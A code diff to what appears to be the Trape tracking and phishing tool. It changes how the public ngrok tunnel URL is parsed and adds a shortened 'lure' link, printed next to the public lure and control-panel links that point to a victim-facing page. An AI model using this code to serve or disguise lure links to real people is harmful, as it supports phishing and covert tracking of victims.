@@ -199,22 +199,30 @@ class Trape(object):
 					if ngrokUrlPos <= 0:
 						time.sleep(4)
 						ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\n', '').replace(' ', '')
+						#get url by key from dictionary instead of hardcoding
+						parse_ngrokStatus = json.loads(str(ngrokStatus)[2:][:-3]) #conv str, rm b'/n', decode json type to dict
+						ngrok_url = parse_ngrokStatus['tunnels'][0]['public_url'] #{'tunnels': []}, dict as first item of list, public_url
 						ngrokUrlPos = ngrokStatus.find('ngrok.io')
 					if ngrokUrlPos >= 0:
 						ngrokStatus = ngrokStatus[ngrokUrlPos-25:ngrokUrlPos+28]
 						ngrokUrlPos = ngrokStatus.find('http')
 						ngrokUrlPos2 = ngrokStatus.find('.io')
-						ngrokStatus = ngrokStatus[ngrokUrlPos: ngrokUrlPos2] + '.io'
+						#ngrokStatus = ngrokStatus[ngrokUrlPos: ngrokUrlPos2] + '.io' #unnecessary
+						ngrokStatus = ngrok_url
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['whiteBold'] + "PUBLIC INFORMATION" + utils.Text['end'])
 						utils.Go("\t" + "-------------------")
 						r = utils.gShortener(self.googl, ngrokStatus.replace('https', 'http') + '/' + self.victim_path)
+						shortened_url = {}
+						shortened_url['id'] = json.loads(r)
 						self.nGrokUrl = ngrokStatus.replace('https', 'http')
+						shortened_url = str(shortened_url['id']['id']).replace('https', 'http')
+						utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Short.io Shortened lure: " + utils.Color['blue'] + shortened_url + utils.Color['white'])
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Public lure: " + utils.Color['blue'] + self.nGrokUrl + '/' + self.victim_path + utils.Color['white'])
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Control Panel link: " + utils.Color['blue'] + ngrokStatus.replace('https', 'http') + '/' + self.stats_path + utils.Color['white'])
 					else:
 						utils.Go(utils.Color['red'] + "\t" + utils.Color['green'] + "-" + utils.Color['white'] + "--" + utils.Color['red'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " We can't connect with nGrok " + utils.Color['white'])
 				except Exception as e:
-					utils.Go(utils.Color['white'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "ERROR: " + " " + utils.Color['white'] + e.message)
+					utils.Go(utils.Color['white'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "ERROR: " + " " + utils.Color['white'] + str(e))
 					utils.Go(utils.Color['red'] + "\t" + utils.Color['green'] + "-" + utils.Color['white'] + "--" + utils.Color['red'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " We can't connect with nGrok " + utils.Color['white'])
 			utils.Go("\n" + utils.Color['white'])
 			utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + ">" + utils.Color['white'] + "]" + utils.Color['whiteBold'] + " " + "Start time:" + " " + utils.Color['white'] + self.date_start)
